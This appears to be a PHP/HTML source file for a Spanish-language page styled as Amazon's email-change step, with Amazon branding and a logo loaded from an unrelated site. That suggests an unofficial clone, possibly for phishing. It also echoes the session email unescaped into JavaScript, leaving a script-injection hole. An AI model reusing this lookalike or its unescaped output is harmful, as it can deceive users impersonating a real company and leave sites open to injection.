<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verificar dirección de correo electrónico - Amazon</title>
    <link rel="stylesheet" href="css/cambiar_datos_email2.css">
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var storedEmail = "<?php echo isset($_SESSION['email']) ? $_SESSION['email'] : 'correo@example.com'; ?>";
            var emailElement = document.querySelector(".email");
            emailElement.textContent = storedEmail;
            localStorage.setItem("email", storedEmail); // Guardar email en localStorage
            document.getElementById("hidden-email").value = storedEmail;
        });

        function handleVerification() {
            var newEmail = document.querySelector(".code-input").value;

            fetch('BACK/actualizar_email2.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: 'new_email=' + encodeURIComponent(newEmail) // Enviar el nuevo correo electrónico ingresado
            })
            .then(response => response.json())
            .then(data => {
                console.log("Received response:", data);
                if (data.success) {
                    alert("Se ha enviado un código de verificación al nuevo correo electrónico. Por favor, verifica tu correo.");
                    window.location.href = 'cambiar_datos_email3.php';
                } else {
                    alert("Error al enviar el código de verificación. Por favor, intenta de nuevo.");
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</head>
<body>
    <section class="flex1">
        <div class="logo">
            <img src="https://abellagraphicdesign.com/wp-content/uploads/2023/02/DESTACADA_0014_Fondo-copia-6.jpg" alt="Amazon Logo"/>
        </div>
    </section>
    <div class="container">
        <h2 class="title">Modifica tu dirección de correo electrónico</h2>
        <p>Dirección de correo electrónico actual: <span class="email"><?php echo isset($_SESSION['email']) ? htmlspecialchars($_SESSION['email']) : 'correo@example.com'; ?></span></p>
        
        <form action="cambiar_datos_email3.php" method="POST">
            <label>Escribe a continuación la nueva dirección de correo electrónico con la que deseas asociar tu cuenta. Enviaremos un código de verificación a esa dirección.</label>
            <b><p>Nueva dirección de correo electrónico</p></b>
            <input type="text" name="new_email" class="code-input">
            <div class="button-container">
                <button type="button" class="button" onclick="handleVerification()">Continuar</button>
            </div>
        </form>
    </div>
    <section class="flex2">
        <div class="links">
            <a href="#" class="help">Ayuda</a> | <a href="#" class="terms">Condiciones de Uso</a> | <a href="#" class="privacy">Aviso de Privacidad</a>
            <p>&copy; 1996-2024 Amazon.com, Inc. o sus afiliados</p>
        </div>
    </section>
</body>
</html>
